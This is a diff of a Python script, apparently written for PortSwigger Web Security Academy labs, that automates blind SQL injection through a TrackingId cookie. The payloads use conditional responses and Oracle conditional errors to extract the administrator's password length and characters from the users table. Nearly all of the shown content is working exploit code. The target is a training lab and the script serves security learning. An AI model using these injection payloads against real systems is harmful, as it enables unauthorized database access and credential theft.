@@ -4,13 +4,13 @@
 import requests
 requests.packages.urllib3.disable_warnings()
 
-base = "https://ac3e1f191f04a61780e34c3400bc0067.web-security-academy.net"
+base = "https://ac8f1f0d1f5160fd8057c87200b800cd.web-security-academy.net"
 url = base
 
 proxy = "127.0.0.1:8080"
 proxies = {"https": proxy, "http": proxy}
 verify = False
-cookies = {"session": "JXTZoDRywghW1LQyJUGMaFufdOlcmCTk"}
+cookies = {"session": "VVXQRGw3N3jH2NKYMtdsnMzs6VE99ucI"}
 key = "TrackingId"
 digitCodePoints = [i for i in range(48, 58)]
 lowerCaseAlphabetCodePoints = [i for i in range(97, 123)]
@@ -19,8 +19,9 @@ codePointList = digitCodePoints + lowerCaseAlphabetCodePoints
 def getSqliConditionalResponsesQuery(trueCondition):
     return f"' UNION SELECT 'a' FROM users WHERE username = 'administrator' AND {trueCondition}"
 
-def getSqliConditionalErrorsQuery(trueCondition):
-    return f"' UNION SELECT CASE WHEN ({trueCondition}) THEN 1/0 ELSE NULL END-- "
+def getSqliConditionalErrorsQuery(trueCondition, table):
+    # Because an Oracle database is being used, this exact syntax is required
+    return f"' UNION SELECT CASE WHEN ({trueCondition}) THEN to_char(1/0) ELSE NULL END FROM {table}-- "
 
 def findNumberOfColumns():
     for i in range(1,5):
@@ -29,8 +30,14 @@ def findNumberOfColumns():
         requests.get(url, verify=verify, proxies=proxies, cookies=cookies)
         del cookies[key]
 
-def determineStringLength():
-    def makeRequest(func):
+def determinePasswordLength():
+    def makeSingleRequest(func):
+        value = func()
+        cookies[key] = value
+        requests.get(url, verify=verify, proxies=proxies, cookies=cookies)
+        del cookies[key]
+
+    def makeMultipleRequests(func):
         for i in range(1,25):
             value = func(i)
             cookies[key] = value
@@ -40,11 +47,20 @@ def determineStringLength():
     def usingConditionalResponse(i):
         return getSqliConditionalResponsesQuery(f"LENGTH(password) > {i}-- ")
 
-    def usingConditionalError(i):
-        return getSqliConditionalErrorsQuery(f"LENGTH(password) > {i}")
+    def usingConditionalError(i=0):
+        def determineUsernameUsingUsersTable(username):
+            return getSqliConditionalErrorsQuery(f"username='{username}'", "users")
+
+        def determinePasswordLengthUsingUsersTable(i, username):
+            return getSqliConditionalErrorsQuery(f"username='{username}' AND LENGTH(password) > {i}", "users")
+
+        # return determineUsernameUsingUsersTable("administrator")
+        return determinePasswordLengthUsingUsersTable(i, "administrator")
 
     # makeRequest(usingConditionalResponse)
-    makeRequest(usingConditionalError)
+    # To do: make fluent interface more readable. Right now reader cannot tell when to use single and when to use multiple.
+    # makeSingleRequest(usingConditionalError)
+    makeMultipleRequests(usingConditionalError)
 
 
 def conditionalResponses(): # 20 len
@@ -104,7 +120,7 @@ def login():
 
 
 # findNumberOfColumns()
-determineStringLength()
+determinePasswordLength()
 # conditionalResponses()
 # conditionalErrors()
 # login()
